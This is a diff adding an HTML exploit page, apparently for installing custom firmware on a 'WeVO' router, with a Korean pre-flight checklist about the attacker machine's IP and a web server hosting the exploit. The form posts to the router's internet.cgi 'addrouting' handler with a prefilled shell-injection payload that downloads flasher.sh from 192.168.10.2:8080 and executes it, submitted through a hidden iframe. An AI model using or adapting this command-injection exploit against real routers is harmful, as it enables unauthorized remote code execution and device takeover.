@@ -1,0 +1,44 @@
+<html>
+    <head>
+        <title>Hello, world!</title>
+        <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/pure-min.css" integrity="sha384-nn4HPE8lTHyVtfCBi5yW9d20FjT8BJwUXyWZT9InLYax14RDjBj46LmSztkmNP9w" crossorigin="anonymous">
+        <script src="js/index.js"></script>
+        <link rel="stylesheet" href="css/index.css">
+    </head>
+    <body>
+        <div class="container">
+            <h2>Pre-flight checklist</h2>
+            <ol>
+                <li>익스플로잇을 실행하는 머신의 IP 주소가 192.168.10.2 로 설정되어 있습니까?</li>
+                <li>익스플로잇을 실행하는 머신의 8080 포트에 익스플로잇을 호스트하는 웹 서버가 가동 중입니까?</li>
+                <li>공유기의 LAN IP 주소가 192.168.10.1 이 맞습니까?</li>
+            </ol>
+            <h2>Exploit!</h2>
+            <form action="http://0.0.0.0/cgi-bin/internet.cgi" method="post" id="exploiter" target="posttarg" class="pure-form pure-form-aligned">
+                <fieldset>
+                    <legend>Let's install CFW on WeVO!</legend>
+                    <div class="pure-control-group">
+                        <label for="payload">Victim IP</label>
+                        <input type="text" name="targetip" id="targetip" value="192.168.10.1">
+                    </div>
+                    <div class="pure-control-group">
+                        <label for="payload">Shell command injection</label>
+                        <input type="text" name="payload" id="payload" value="cp /bin/busybox /tmp/extbin; wget -O /tmp/extbin http://192.168.10.2:8080/asset/flasher.sh; /tmp/extbin 192.168.10.2:8080">
+                    </div>
+                    <input type="hidden" name="dest" id="dest" value="111.111.111.111">
+                    <input type="hidden" name="page" value="addrouting">
+                    <input type="hidden" name="hostnet" value="host">
+                    <input type="hidden" name="netmask" value="">
+                    <input type="hidden" name="gateway" value="111.111.111.111">
+                    <input type="hidden" name="interface" value="lan">
+                    <input type="hidden" name="custom_interface" value="">
+                    <input type="hidden" name="comment" value="foo">
+                    <div class="pure-control-group" style="text-align: right;">
+                        <button type="button" class="pure-button pure-button-primary" id="romload" onclick="inject()">Execute!</button>
+                    </div>
+                </fieldset>
+            </form>
+            <iframe name="posttarg" style="width:0;height:0;border:0; border:none;"></iframe>
+        </div>
+    </body>
+</html>
